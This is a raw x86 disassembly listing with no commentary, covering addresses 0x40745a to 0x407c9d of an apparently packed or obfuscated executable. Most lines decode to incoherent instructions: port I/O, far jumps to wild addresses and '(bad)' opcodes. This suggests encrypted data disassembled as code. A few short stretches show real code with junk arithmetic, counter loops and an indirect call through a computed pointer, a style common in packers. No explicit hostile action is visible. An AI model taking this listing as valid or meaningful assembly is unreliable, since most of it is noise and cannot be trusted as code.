  40745a:	and    BYTE PTR [edx+ecx*4+0x74],0x7d
  40745f:	cmp    al,0xea
  407461:	sub    DWORD PTR [edx-0x7dd9eccd],0x9bf1ee33
  40746b:	xchg   DWORD PTR [eax],ecx
  40746d:	and    ah,BYTE PTR [eax-0x2b]
  407470:	mov    al,ds:0x5f8113ed
  407475:	adc    edi,edi
  407477:	jle    0x40748f
  407479:	outs   dx,DWORD PTR ds:[esi]
  40747a:	adc    DWORD PTR [esi],eax
  40747c:	fdivr  DWORD PTR [esi]
  40747e:	cmp    BYTE PTR [eax-0x43],0x70
  407482:	bound  esp,QWORD PTR [eax]
  407484:	pop    ecx
  407485:	leave  
  407486:	and    al,BYTE PTR [ecx+0x78]
  407489:	ror    BYTE PTR [edi+0x37365d3e],cl
  40748f:	fsubr  DWORD PTR [ebp+edi*4-0x35be9e2d]
  407496:	xor    al,al
  407498:	push   eax
  407499:	shl    ch,1
  40749b:	test   al,0x6d
  40749d:	dec    ecx
  40749e:	daa    
  40749f:	cli    
  4074a0:	loope  0x40746a
  4074a2:	in     eax,dx
  4074a3:	data16 stos BYTE PTR es:[edi],al
  4074a5:	cdq    
  4074a6:	inc    ecx
  4074a7:	adc    eax,0x6262223f
  4074ac:	pushf  
  4074ad:	push   edx
  4074ae:	xor    BYTE PTR [esi+ecx*1],ch
  4074b1:	xor    DWORD PTR [eax+ebp*1],edx
  4074b4:	push   ecx
  4074b5:	pop    esp
  4074b6:	std    
  4074b7:	inc    eax
  4074b8:	sub    eax,DWORD PTR [eax]
  4074ba:	ror    DWORD PTR [edx+edx*8-0x15],0xa0
  4074bf:	xchg   ebp,eax
  4074c0:	fisub  WORD PTR [ebp-0x70c1e541]
  4074c6:	inc    eax
  4074c7:	fisub  DWORD PTR ss:[edx]
  4074ca:	rol    dh,1
  4074cc:	ror    DWORD PTR [eax+0x4a],0x1c
  4074d0:	cmp    eax,0x5bec942d
  4074d5:	das    
  4074d6:	popf   
  4074d7:	inc    eax
  4074d8:	push   ebp
  4074d9:	cwde   
  4074da:	xor    al,BYTE PTR [esi]
  4074dc:	in     al,0xcb
  4074de:	(bad)  
  4074df:	mov    edx,0x3beb6566
  4074e4:	pop    ecx
  4074e5:	sahf   
  4074e6:	pop    ebx
  4074e7:	push   esi
  4074e8:	loope  0x407534
  4074ea:	or     al,0x17
  4074ec:	ret    0xfc5f
  4074ef:	xor    ch,dl
  4074f1:	test   ecx,ecx
  4074f3:	cli    
  4074f4:	inc    eax
  4074f5:	test   eax,0xa9dbf594
  4074fa:	push   ss
  4074fb:	and    bh,BYTE PTR [ebp+edx*8-0x1c]
  4074ff:	cs push 0x30
  407502:	and    edx,DWORD PTR [ecx+0x5d4ebe3a]
  407508:	pop    ebp
  407509:	in     eax,0x23
  40750b:	jmp    0x4074b5
  40750d:	jge    0x407521
  40750f:	sub    DWORD PTR [ebp+0x35],0x679a840b
  407516:	adc    DWORD PTR ds:0x13445ad5,ecx
  40751c:	aam    0xb9
  40751e:	scas   eax,DWORD PTR es:[edi]
  40751f:	xchg   ebp,eax
  407520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407521:	(bad)  
  407522:	mov    cl,0xf1
  407524:	(bad)  
  407525:	mov    eax,0xaae201d
  40752a:	aad    0x5d
  40752c:	dec    ebx
  40752d:	retf   
  40752e:	in     eax,0xc
  407530:	test   eax,0xcf8455cc
  407535:	out    dx,al
  407536:	and    cl,BYTE PTR [ecx+0x2d]
  407539:	stc    
  40753a:	push   ss
  40753b:	inc    esp
  40753c:	sub    BYTE PTR [edx+0x28],ch
  40753f:	idiv   DWORD PTR [esp+ebp*8]
  407542:	cmp    bh,ch
  407544:	pop    esi
  407545:	enter  0xbf66,0x25
  407549:	std    
  40754a:	jecxz  0x40756b
  40754c:	(bad)  
  40754f:	sub    BYTE PTR [edx+0x7410e881],bh
  407555:	xchg   edi,eax
  407556:	scas   eax,DWORD PTR es:[edi]
  407557:	mov    cl,0x7a
  407559:	sub    eax,0x7ef77e6c
  40755e:	imul   DWORD PTR [ecx]
  407560:	pop    ds
  407561:	in     eax,dx
  407562:	cld    
  407563:	aaa    
  407564:	push   es
  407565:	aam    0xf4
  407567:	nop
  407568:	adc    edx,ebp
  40756a:	sar    esi,1
  40756c:	jmp    0x48880419
  407571:	fcom   DWORD PTR [eax]
  407573:	movntq QWORD PTR [ecx+0x6c27897e],mm1
  40757a:	mov    ebx,DWORD PTR [edx+ebp*2]
  40757d:	jne    0x407501
  40757f:	jno    0x407526
  407581:	pop    ebp
  407582:	stos   BYTE PTR es:[edi],al
  407583:	sar    BYTE PTR [esi],1
  407585:	inc    ecx
  407586:	push   ecx
  407587:	mul    DWORD PTR ds:0xb8b8a7ea
  40758d:	cmp    al,0x5
  40758f:	sbb    bl,dl
  407591:	xor    cl,al
  407593:	cli    
  407594:	mov    bh,0x70
  407596:	and    DWORD PTR [edx-0x75],eax
  407599:	xchg   edx,eax
  40759a:	mov    ebp,0xb0a935f4
  40759f:	mov    bl,0x8a
  4075a1:	dec    esp
  4075a2:	xchg   esi,eax
  4075a3:	and    esp,edx
  4075a5:	or     esp,DWORD PTR [ecx]
  4075a7:	cmp    eax,0x4f5613cd
  4075ac:	jno    0x4075a0
  4075ae:	pop    edi
  4075af:	ja     0x407624
  4075b1:	jbe    0x40761e
  4075b3:	cmc    
  4075b4:	or     eax,0x9a47e345
  4075b9:	call   0x16cf6cc8
  4075be:	outs   dx,BYTE PTR ds:[esi]
  4075bf:	(bad)  
  4075c0:	cmp    BYTE PTR [ebx-0x5146a398],dh
  4075c6:	in     eax,0x2b
  4075c8:	das    
  4075c9:	mov    esp,0x40dceac9
  4075ce:	(bad)  [eax+0x1deb6415]
  4075d4:	sbb    BYTE PTR [ebx+0x67],0x1c
  4075d8:	lods   eax,DWORD PTR ds:[esi]
  4075d9:	cmp    eax,0x32482b6c
  4075de:	mov    ds:0x750c9fec,al
  4075e3:	jp     0x407635
  4075e5:	mov    ch,0x16
  4075e7:	cmp    eax,0x4ae48093
  4075ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075ed:	and    dl,dh
  4075ef:	call   0x9a0fd1b5
  4075f4:	inc    ebp
  4075f5:	cmp    BYTE PTR [ecx],cl
  4075f7:	pushf  
  4075f8:	add    al,0x54
  4075fa:	shl    al,cl
  4075fc:	sbb    al,cl
  4075fe:	and    bh,BYTE PTR [edx]
  407600:	loopne 0x4075d6
  407602:	mov    edi,0xe5b40642
  407607:	push   0x8c54a5ba
  40760c:	adc    BYTE PTR [ebx+0x4f],bh
  40760f:	out    0x18,al
  407611:	mov    ebx,0x3eee50c
  407616:	fwait
  407617:	mov    al,ds:0xd1403094
  40761c:	pop    ebp
  40761d:	jo     0x40761e
  40761f:	and    al,0xe9
  407621:	or     ebp,0x25
  407624:	adc    al,0x8
  407627:	ds pop esp
  407629:	jmp    0x9d17e49a
  40762e:	stos   DWORD PTR es:[edi],eax
  40762f:	in     al,0x3d
  407631:	mov    edx,0x71a84108
  407636:	(bad)  
  407637:	and    cl,cl
  407639:	mov    bh,0x2d
  40763b:	stos   BYTE PTR es:[edi],al
  40763c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40763d:	jb     0x4075fa
  40763f:	aad    0x1d
  407641:	cmp    esi,DWORD PTR [ecx-0x9]
  407644:	in     al,dx
  407645:	xchg   ecx,eax
  407646:	and    ecx,esp
  407648:	mov    ch,0xe5
  40764a:	push   ebx
  40764b:	dec    eax
  40764c:	pop    ebp
  40764d:	lods   eax,DWORD PTR ds:[esi]
  40764e:	push   eax
  40764f:	jb     0x40763d
  407651:	push   0x356b9715
  407656:	and    ecx,DWORD PTR [edx-0xd261150]
  40765c:	aad    0xda
  40765e:	mov    cs,WORD PTR [ecx+edx*8+0x687a493d]
  407665:	test   al,0xf7
  407667:	pop    ds
  407668:	call   0x164d2c7a
  40766d:	loope  0x40763d
  40766f:	lea    esp,[edi-0x1aac85a8]
  407675:	rol    DWORD PTR [esi],cl
  407677:	mov    ds:0x7f57167a,al
  40767c:	mov    ah,0x71
  40767e:	jmp    0x827baf9f
  407683:	(bad)  
  407684:	mov    dh,0xfe
  407686:	cmp    dh,BYTE PTR [ebp+0x36]
  407689:	nop
  40768a:	mov    bl,0xc9
  40768c:	push   ebp
  40768d:	cmp    edx,ecx
  40768f:	fdiv   QWORD PTR [esi-0x6c]
  407692:	test   al,0xc5
  407694:	aaa    
  407695:	sbb    al,dh
  407697:	(bad)  
  407698:	cmp    DWORD PTR [eax+esi*4],esi
  40769b:	pop    edi
  40769c:	and    DWORD PTR ds:0x8b9760eb,0xffffffc0
  4076a3:	std    
  4076a4:	sbb    ebx,eax
  4076a6:	fnstcw WORD PTR [ecx]
  4076a8:	mov    BYTE PTR [edi+0x6d3696ee],bl
  4076ae:	leave  
  4076af:	into   
  4076b0:	jmp    0x470d:0x76e23038
  4076b7:	jge    0x4076eb
  4076b9:	call   0xf019:0xfcfa011
  4076c0:	cwde   
  4076c1:	ficom  WORD PTR [edi+0x60dc42b1]
  4076c7:	sub    DWORD PTR [ecx-0x9],edi
  4076ca:	mov    bl,0x27
  4076cc:	stos   BYTE PTR es:[edi],al
  4076cd:	sub    al,0x66
  4076cf:	xchg   BYTE PTR [edx],cl
  4076d1:	test   DWORD PTR [edi],ebp
  4076d3:	sub    DWORD PTR [ecx-0x26c9fa18],esi
  4076d9:	js     0x407742
  4076db:	mov    bh,0xbd
  4076dd:	xchg   esi,eax
  4076de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076df:	adc    eax,0x2ff50595
  4076e4:	(bad)  
  4076e5:	out    dx,al
  4076e6:	xchg   ebx,eax
  4076e7:	in     al,dx
  4076e8:	cs push 0x4
  4076eb:	jbe    0x407759
  4076ed:	addr16 dec ebp
  4076ef:	add    eax,0xe4eb701
  4076f4:	or     DWORD PTR [eax-0x2cf15991],ebx
  4076fa:	push   ebp
  4076fb:	pop    ss
  4076fc:	shl    bh,0x42
  4076ff:	push   edi
  407700:	fwait
  407701:	cmp    DWORD PTR [esp+edi*2-0x60],ebx
  407705:	jg     0x407717
  407707:	mov    dl,0x66
  407709:	add    eax,0x48e3d16f
  40770e:	pop    ebx
  40770f:	dec    esp
  407710:	cli    
  407711:	ret    
  407712:	in     al,dx
  407713:	cld    
  407714:	in     al,dx
  407715:	add    BYTE PTR [edx-0x13],dl
  407718:	jg     0x4076aa
  40771a:	dec    BYTE PTR [bp+si]
  40771d:	push   DWORD PTR [ebp-0x10]
  407720:	mov    eax,ds:0x41625c
  407725:	mov    eax,DWORD PTR [eax]
  407727:	push   DWORD PTR [eax]
  407729:	lea    eax,ds:0x416278
  40772f:	push   DWORD PTR [eax]
  407731:	lea    eax,ds:0x416024
  407737:	push   DWORD PTR [eax]
  407739:	lea    eax,ds:0x416258
  40773f:	push   DWORD PTR [eax]
  407741:	lea    eax,ds:0x4162e0
  407747:	push   DWORD PTR [eax]
  407749:	xchg   ebx,edx
  40774b:	inc    ebx
  40774c:	inc    ebx
  40774d:	sub    ebx,0x3
  407750:	push   ebx
  407751:	pop    eax
  407752:	call   DWORD PTR [eax+0x1]
  407755:	mov    eax,DWORD PTR [ebp-0x20]
  407758:	mov    ecx,DWORD PTR ds:0x41621c
  40775e:	add    DWORD PTR [eax],ecx
  407760:	pop    edi
  407761:	pop    esi
  407762:	pop    ebx
  407763:	leave  
  407764:	ret    
  407765:	push   ebp
  407766:	mov    ebp,esp
  407768:	sub    esp,0x44
  40776b:	push   edi
  40776c:	sbb    DWORD PTR ds:0x434319,edx
  407772:	mov    eax,DWORD PTR [ebp+0xc]
  407775:	mov    edx,DWORD PTR ds:0x432d64
  40777b:	mov    edi,DWORD PTR ds:0x434349
  407781:	sub    edx,edi
  407783:	xor    edx,DWORD PTR [edx+edi*1]
  407786:	mov    DWORD PTR [ebp-0x10],eax
  407789:	adc    DWORD PTR ds:0x432ce6,edx
  40778f:	mov    eax,DWORD PTR [ebp+0x8]
  407792:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  407799:	sub    ecx,DWORD PTR ds:0x434266
  40779f:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  4077a6:	mov    edx,DWORD PTR [ebp+0x8]
  4077a9:	and    DWORD PTR ds:0x4325ec,0x0
  4077b3:	xor    edi,edi
  4077b5:	add    edi,DWORD PTR ds:0x4325ec
  4077bb:	inc    edi
  4077bc:	mov    DWORD PTR ds:0x4325ec,edi
  4077c2:	cmp    DWORD PTR ds:0x4325ec,0xb
  4077c9:	jne    0x4077e2
  4077cf:	push   DWORD PTR [ebp-0x14]
  4077d2:	push   0x178d
  4077d7:	push   0x434321
  4077dc:	call   DWORD PTR ds:0x4328ca
  4077e2:	cmp    DWORD PTR ds:0x4325ec,0xa
  4077e9:	jne    0x4077fe
  4077ef:	xor    edi,edi
  4077f1:	add    edi,DWORD PTR ds:0x4325ec
  4077f7:	inc    edi
  4077f8:	mov    DWORD PTR ds:0x4325ec,edi
  4077fe:	cmp    DWORD PTR ds:0x4325ec,0x1b
  407805:	jb     0x4077b3
  40780b:	mov    DWORD PTR [ebp-0x40],eax
  40780e:	mov    eax,0x7510855
  407813:	or     edi,edi
  407815:	xor    edx,eax
  407817:	mov    ecx,0x32729c
  40781c:	adc    DWORD PTR ds:0x432cde,edi
  407822:	add    edx,ecx
  407824:	mov    edi,DWORD PTR ds:0x43426e
  40782a:	or     DWORD PTR ds:0x4325fc,edi
  407830:	mov    DWORD PTR [ebp-0x8],edx
  407833:	adc    DWORD PTR ds:0x434315,ecx
  407839:	mov    edx,DWORD PTR [ebp+0x8]
  40783c:	sbb    DWORD PTR ds:0x432600,0x434292
  407846:	xor    edx,eax
  407848:	add    edx,ecx
  40784a:	mov    edi,DWORD PTR ds:0x4325ec
  407850:	or     edi,DWORD PTR ds:0x4325f0
  407856:	mov    DWORD PTR ds:0x4325ec,edi
  40785c:	mov    DWORD PTR [ebp+0xc],edx
  40785f:	inc    edi
  407860:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  407867:	mov    DWORD PTR ds:0x434325,0x1e
  407871:	cmp    DWORD PTR ds:0x434325,0x0
  407878:	je     0x407aca
  40787e:	cmp    DWORD PTR ds:0x434325,0x22
  407885:	jne    0x407891
  40788b:	call   DWORD PTR ds:0x432bf6
  407891:	xor    edi,edi
  407893:	add    edi,DWORD PTR ds:0x434325
  407899:	dec    edi
  40789a:	mov    DWORD PTR ds:0x434325,edi
  4078a0:	jmp    0x407871
  4078a5:	mov    edx,DWORD PTR ds:0x4342a6
  4078ab:	mov    edi,DWORD PTR ds:0x434369
  4078b1:	sub    edx,edi
  4078b3:	add    edx,DWORD PTR [edx+edi*1]
  4078b6:	jmp    0x407aca
  4078bb:	fldcw  WORD PTR [eax+0x3e]
  4078be:	cs push ecx
  4078c0:	mov    dh,0xe9
  4078c2:	jae    0x407865
  4078c4:	shl    DWORD PTR [edi+0x64],cl
  4078c7:	dec    ecx
  4078c8:	cmp    eax,0xce5bd438
  4078cd:	jo     0x40793f
  4078cf:	imul   edi,DWORD PTR [edi+0x70],0x7224a870
  4078d6:	mov    ah,0x5
  4078d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078d9:	shl    BYTE PTR [edx+0x326cfe3c],1
  4078df:	mov    esi,0x3d6e2b1
  4078e4:	out    0xd,al
  4078e6:	pop    es
  4078e7:	or     edi,DWORD PTR [ebx]
  4078e9:	xor    al,0xe8
  4078eb:	jb     0x1f802b50
  4078f1:	pop    esi
  4078f2:	xchg   ebx,eax
  4078f3:	cmp    DWORD PTR [edi+ebp*8-0x6d],ebp
  4078f7:	adc    edx,DWORD PTR [ebx-0x1]
  4078fa:	lds    esi,FWORD PTR [edx*4+0x3c9e4d8c]
  407901:	pop    edx
  407902:	sub    eax,0x6a0f4b08
  407907:	imul   esp,DWORD PTR [ebp-0x289cdfaf],0xffffffff
  40790e:	int    0xda
  407910:	xor    al,0x1d
  407912:	les    edi,FWORD PTR [esi+ecx*1]
  407915:	mov    ebp,0x90fe37c0
  40791a:	and    DWORD PTR [eax],0xffffffb1
  40791d:	mov    WORD PTR [eax*1+0x2973d829],es
  407924:	adc    BYTE PTR [esi-0x57],bl
  407927:	(bad)  
  407929:	mov    WORD PTR [eax],ax
  40792c:	adc    eax,0x615fe889
  407931:	dec    esi
  407932:	lods   al,BYTE PTR ds:[esi]
  407933:	inc    ebx
  407934:	or     al,0x83
  407936:	and    dh,BYTE PTR [ebp-0x3358109c]
  40793c:	loopne 0x4079a7
  40793e:	pop    ebp
  40793f:	popf   
  407940:	sub    BYTE PTR [edx],0xf9
  407943:	clc    
  407944:	leave  
  407945:	and    al,0xf9
  407947:	in     al,dx
  407948:	jae    0x4078d7
  40794a:	mov    esp,0x799f2dde
  40794f:	daa    
  407950:	inc    ebp
  407951:	inc    edi
  407952:	sub    eax,0x4c8cc256
  407957:	inc    esp
  407958:	test   dl,ah
  40795a:	dec    esi
  40795b:	lea    edi,[edi]
  40795d:	pushf  
  40795e:	pop    ecx
  40795f:	mov    cl,0x95
  407961:	cmp    dh,cl
  407963:	jle    0x4079d4
  407965:	cmc    
  407966:	xchg   dl,dl
  407968:	sahf   
  407969:	and    bl,BYTE PTR gs:[ecx+0x16]
  40796d:	inc    ebx
  40796e:	xor    BYTE PTR [edx+0x1612f4ee],al
  407974:	and    al,0x4f
  407976:	lock pop edi
  407978:	div    DWORD PTR [edi]
  40797a:	in     al,dx
  40797b:	adc    DWORD PTR [ebp+0x57b18f55],0xffffffcb
  407982:	push   edx
  407983:	cmp    BYTE PTR [esi+0x6d],ah
  407986:	(bad)  
  407987:	mov    ds:0xf7bb461a,eax
  40798c:	mov    al,ss:0x56fd11fd
  407992:	push   ds
  407993:	pop    ds
  407994:	popf   
  407995:	mov    esi,eax
  407997:	dec    edi
  407998:	hlt    
  407999:	lods   al,BYTE PTR ds:[esi]
  40799a:	cmp    ebp,DWORD PTR [esi-0x7e]
  40799d:	adc    edx,ecx
  40799f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079a0:	mov    edx,0xcb37eed2
  4079a5:	xchg   ebx,eax
  4079a6:	mov    eax,0x4647789d
  4079ab:	test   al,0x40
  4079ad:	jmp    FWORD PTR [edx-0x3c]
  4079b0:	xchg   DWORD PTR [esi],esp
  4079b2:	call   0x7851:0xe50120ff
  4079b9:	mov    esi,0xa707cbbb
  4079be:	mov    WORD PTR [edi-0x34597e48],gs
  4079c4:	jl     0x4079b8
  4079c6:	popf   
  4079c7:	add    ebp,DWORD PTR [edx-0x3e]
  4079ca:	or     dh,bh
  4079cc:	xlat   BYTE PTR ds:[ebx]
  4079cd:	idiv   DWORD PTR [ebp+0x52932029]
  4079d3:	cdq    
  4079d4:	iret   
  4079d5:	add    eax,0x1d6d0a21
  4079da:	dec    ebp
  4079db:	cld    
  4079dc:	clc    
  4079dd:	pop    eax
  4079de:	mov    al,ds:0x1d5e0643
  4079e3:	mov    al,0xb5
  4079e5:	and    ah,dl
  4079e7:	hlt    
  4079e8:	ins    BYTE PTR es:[edi],dx
  4079e9:	test   DWORD PTR [edi+0x5b],esp
  4079ec:	xchg   esp,eax
  4079ed:	or     eax,0xf23c54e
  4079f2:	mov    esi,0x74756982
  4079f7:	sub    ch,cl
  4079f9:	retf   0xc973
  4079fc:	push   cs
  4079fd:	mov    WORD PTR [esp+edi*2+0x61230b14],gs
  407a04:	mov    al,ds:0xf6252076
  407a09:	in     al,0xa0
  407a0b:	ror    DWORD PTR gs:[eax],cl
  407a0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a0f:	cli    
  407a10:	jecxz  0x407a46
  407a12:	sahf   
  407a13:	je     0x4079ad
  407a15:	aaa    
  407a16:	frstor [eax]
  407a18:	sbb    dl,BYTE PTR [esi+0x39f424c4]
  407a1e:	in     al,0xab
  407a20:	out    0xa8,al
  407a22:	push   edi
  407a23:	pop    esi
  407a24:	int3   
  407a25:	lock in al,dx
  407a27:	cmp    BYTE PTR [ebx+0x2dfc1a9c],al
  407a2d:	xchg   BYTE PTR [edx],dh
  407a2f:	pop    eax
  407a30:	call   0x7efa162
  407a35:	and    DWORD PTR [esi-0x4d2a09d0],edx
  407a3b:	repnz xchg ebp,eax
  407a3d:	pusha  
  407a3e:	mov    WORD PTR [eax-0x78],gs
  407a41:	fcomip st,st(4)
  407a43:	mov    BYTE PTR [eax],bl
  407a45:	aam    0xe1
  407a47:	sub    edx,edi
  407a49:	rcr    dh,1
  407a4b:	push   esp
  407a4c:	inc    ebx
  407a4d:	sub    dh,BYTE PTR [ecx]
  407a4f:	jle    0x407a0f
  407a51:	mov    esp,0xe4311001
  407a56:	pop    ss
  407a57:	fmul   QWORD PTR [edx+eiz*1+0x4a935fbc]
  407a5e:	inc    esi
  407a5f:	adc    BYTE PTR ds:0x63e541be,0x7c
  407a66:	push   esi
  407a67:	in     al,dx
  407a68:	popf   
  407a69:	jns    0x407ab9
  407a6b:	repz lds esi,FWORD PTR [ecx]
  407a6e:	inc    eax
  407a6f:	mov    ch,0xd5
  407a71:	loopne 0x407ad2
  407a73:	out    dx,eax
  407a74:	fild   QWORD PTR [ecx]
  407a76:	dec    edx
  407a77:	push   es
  407a78:	fcmove st,st(5)
  407a7a:	shr    BYTE PTR [ebx],1
  407a7c:	stos   DWORD PTR es:[edi],eax
  407a7d:	cld    
  407a7e:	ds push es
  407a80:	addr16 dec edi
  407a82:	jle    0x407ac9
  407a84:	sub    eax,0xfb72e39d
  407a89:	lods   al,BYTE PTR ds:[esi]
  407a8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a8b:	jl     0x407b03
  407a8d:	xor    eax,0x289708a2
  407a92:	fucomi st,st(2)
  407a94:	shl    BYTE PTR [edi],0x35
  407a97:	mov    edi,0x4b2bc9e6
  407a9c:	add    eax,0xbc3c93e3
  407aa1:	hlt    
  407aa2:	mov    edx,0x821d5a07
  407aa7:	js     0x407ab7
  407aa9:	xor    esi,esi
  407aab:	ja     0x407ab8
  407aad:	cmp    dl,BYTE PTR [edx]
  407aaf:	iret   
  407ab0:	or     eax,0x27a24e8a
  407ab5:	mov    bl,0x11
  407ab7:	pop    eax
  407ab8:	mov    bh,0x92
  407aba:	cmp    esi,DWORD PTR [eax+0x1fd66fa6]
  407ac0:	adc    eax,0x374f9061
  407ac5:	call   edi
  407ac7:	push   ss
  407ac8:	xabort 0xc7
  407acb:	inc    ebp
  407acc:	fdiv   DWORD PTR [ebx]
  407ace:	test   DWORD PTR [eax+edi*8+0x2cce1503],ebx
  407ad5:	inc    ebx
  407ad6:	add    bh,al
  407ad8:	inc    ebp
  407ad9:	aam    0x32
  407adb:	test   DWORD PTR [eax+edi*8+0x426a3d8b],ebx
  407ae2:	inc    ebx
  407ae3:	add    BYTE PTR [ecx],ch
  407ae5:	cmp    eax,0x434272
  407aea:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  407af1:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  407af8:	and    DWORD PTR ds:0x434325,edx
  407afe:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  407b05:	jmp    0x407d19
  407b0a:	lods   eax,DWORD PTR ds:[esi]
  407b0b:	mov    ds:0x75115609,al
  407b10:	jno    0x407b73
  407b12:	fidiv  DWORD PTR [edi+0x7778b7f9]
  407b18:	push   ebx
  407b19:	lds    edx,FWORD PTR [esp+ecx*8+0x70]
  407b1d:	jo     0x407b88
  407b1f:	jg     0x407b91
  407b21:	jo     0x407b4c
  407b23:	lods   eax,DWORD PTR ds:[esi]
  407b24:	mov    eax,0xcfa330c8
  407b29:	adc    dh,BYTE PTR [eax-0x1b085220]
  407b2f:	addr16 sahf 
  407b31:	adc    esp,DWORD PTR [ebp-0x6c]
  407b34:	dec    DWORD PTR [ecx]
  407b36:	push   ds
  407b37:	ins    DWORD PTR es:[edi],dx
  407b38:	lods   al,BYTE PTR ds:[esi]
  407b39:	cwde   
  407b3a:	pop    eax
  407b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b3c:	inc    edx
  407b3d:	xor    cl,BYTE PTR [ebp-0x57907af0]
  407b43:	push   cs
  407b44:	loopne 0x407ad3
  407b46:	dec    edi
  407b47:	outs   dx,DWORD PTR ds:[esi]
  407b48:	cmp    eax,0xd9c4b3bc
  407b4d:	push   0xaa6137fb
  407b52:	cld    
  407b53:	jmp    0x260e425
  407b58:	mov    eax,ds:0xd24f9e5
  407b5d:	mov    ah,0x9e
  407b5f:	inc    eax
  407b60:	fwait
  407b61:	pop    ss
  407b62:	loope  0x407b38
  407b64:	scas   al,BYTE PTR es:[edi]
  407b65:	mov    al,0x4
  407b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b68:	or     al,0x64
  407b6a:	shr    DWORD PTR [ebx-0x42a1acc1],0x58
  407b71:	cmp    eax,0x4242e2fa
  407b76:	mov    fs,WORD PTR ds:0x111c1284
  407b7c:	inc    edi
  407b7d:	jo     0x407ba0
  407b7f:	fiadd  WORD PTR [ebp*8+0x9f08a00]
  407b86:	xchg   esi,eax
  407b87:	sub    dh,BYTE PTR [edi]
  407b89:	jnp    0x407b6c
  407b8b:	push   cs
  407b8c:	shl    BYTE PTR [edx+0x49aaf562],0x15
  407b93:	(bad)  
  407b95:	xor    eax,0xa46f43a8
  407b9a:	in     al,dx
  407b9b:	shl    BYTE PTR [ecx],cl
  407b9d:	pop    esi
  407b9e:	add    eax,0x5619e580
  407ba3:	push   0x7c
  407ba5:	mov    WORD PTR [esi],?
  407ba7:	xor    al,0x25
  407ba9:	mov    ah,0x4b
  407bab:	out    0x1a,eax
  407bad:	inc    esi
  407bae:	aam    0xcd
  407bb0:	sahf   
  407bb1:	pop    ds
  407bb2:	daa    
  407bb3:	mov    edx,0xc71c8a4b
  407bb8:	fdiv   QWORD PTR [ecx+esi*1+0x5e90432a]
  407bbf:	into   
  407bc0:	pop    esp
  407bc1:	scas   al,BYTE PTR es:[edi]
  407bc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bc3:	jb     0x407b5f
  407bc5:	add    BYTE PTR [edx],0x5e
  407bc8:	jmp    0x407c39
  407bca:	push   ebx
  407bcb:	lods   al,BYTE PTR ds:[esi]
  407bcc:	scas   al,BYTE PTR es:[edi]
  407bcd:	js     0x407bb1
  407bcf:	pop    es
  407bd0:	pop    edi
  407bd1:	mov    ecx,0xe63c9c7e
  407bd6:	outs   dx,DWORD PTR ds:[esi]
  407bd7:	mov    ch,0x25
  407bd9:	mov    al,ds:0x5c718625
  407bde:	push   ecx
  407bdf:	push   eax
  407be0:	xor    BYTE PTR [eax-0x5d9fc4cb],bl
  407be6:	test   eax,0x991d8d36
  407beb:	out    dx,eax
  407bec:	test   DWORD PTR [ecx],esi
  407bee:	cmp    BYTE PTR [ecx-0x48],0xd3
  407bf2:	sub    ch,BYTE PTR [ebx+0x39]
  407bf5:	in     eax,dx
  407bf6:	pusha  
  407bf7:	je     0x407bed
  407bf9:	push   ebp
  407bfa:	sub    eax,0xc751b06f
  407bff:	dec    eax
  407c00:	cmp    dh,BYTE PTR [ebp-0x10]
  407c03:	dec    ebx
  407c04:	pop    ebx
  407c05:	mov    cl,0x4b
  407c07:	add    DWORD PTR [ebx],0xffffffe1
  407c0a:	mov    ch,0x3c
  407c0c:	mov    esp,0xd5d91e4f
  407c11:	sub    cl,cl
  407c13:	into   
  407c14:	push   ds
  407c15:	xchg   edi,eax
  407c16:	add    dl,BYTE PTR [ebp+esi*2+0x2bcf70f]
  407c1d:	xchg   esi,eax
  407c1e:	and    dl,BYTE PTR [edi+0xa]
  407c21:	sub    BYTE PTR [esi],0x1f
  407c24:	mov    ecx,0x2d79b7ab
  407c29:	addr16 xchg ebp,eax
  407c2b:	in     al,dx
  407c2c:	call   0x8c8bad93
  407c31:	ins    DWORD PTR es:[edi],dx
  407c32:	xor    DWORD PTR [ecx+ecx*4+0x50644ee6],esi
  407c39:	cmp    al,0x4
  407c3b:	mov    eax,0x15b7d3f5
  407c40:	pop    eax
  407c41:	sub    edx,eax
  407c43:	nop
  407c44:	dec    edi
  407c45:	push   edx
  407c46:	imul   DWORD PTR [esi-0x138102b5]
  407c4c:	pop    es
  407c4d:	jp     0x407c7a
  407c4f:	jae    0x407c95
  407c51:	mov    ch,0x24
  407c53:	je     0x407bf4
  407c55:	jp     0x407cc1
  407c57:	xchg   ebp,eax
  407c58:	mov    bh,0x3a
  407c5a:	scas   al,BYTE PTR es:[edi]
  407c5b:	dec    esp
  407c5c:	sbb    dl,BYTE PTR [esi+0x26]
  407c5f:	(bad)  
  407c60:	fisubr DWORD PTR [edi-0x43]
  407c63:	pop    ss
  407c64:	in     eax,0xb
  407c66:	xor    DWORD PTR [ecx-0x46afae51],ebp
  407c6c:	mov    ebp,0x1f097164
  407c71:	mov    al,0x12
  407c73:	mov    ah,0x6a
  407c75:	adc    ebp,DWORD PTR [edi+eax*8+0x78]
  407c79:	inc    edi
  407c7a:	cmp    al,0x89
  407c7c:	std    
  407c7d:	ins    BYTE PTR es:[edi],dx
  407c7e:	les    ebp,FWORD PTR [edx]
  407c80:	sbb    esp,0x64
  407c83:	into   
  407c84:	push   edi
  407c85:	loopne 0x407c78
  407c87:	lods   al,BYTE PTR ds:[esi]
  407c88:	or     DWORD PTR [ecx-0x5450deac],esi
  407c8e:	scas   al,BYTE PTR es:[edi]
  407c8f:	aaa    
  407c90:	rcr    dh,0xbf
  407c93:	jmp    0xb3f167ab
  407c98:	(bad)  
  407c99:	cld    
  407c9a:	push   ecx
  407c9b:	jns    0x407c3b
  407c9d:	mov    ds:0xc65db69f,eax
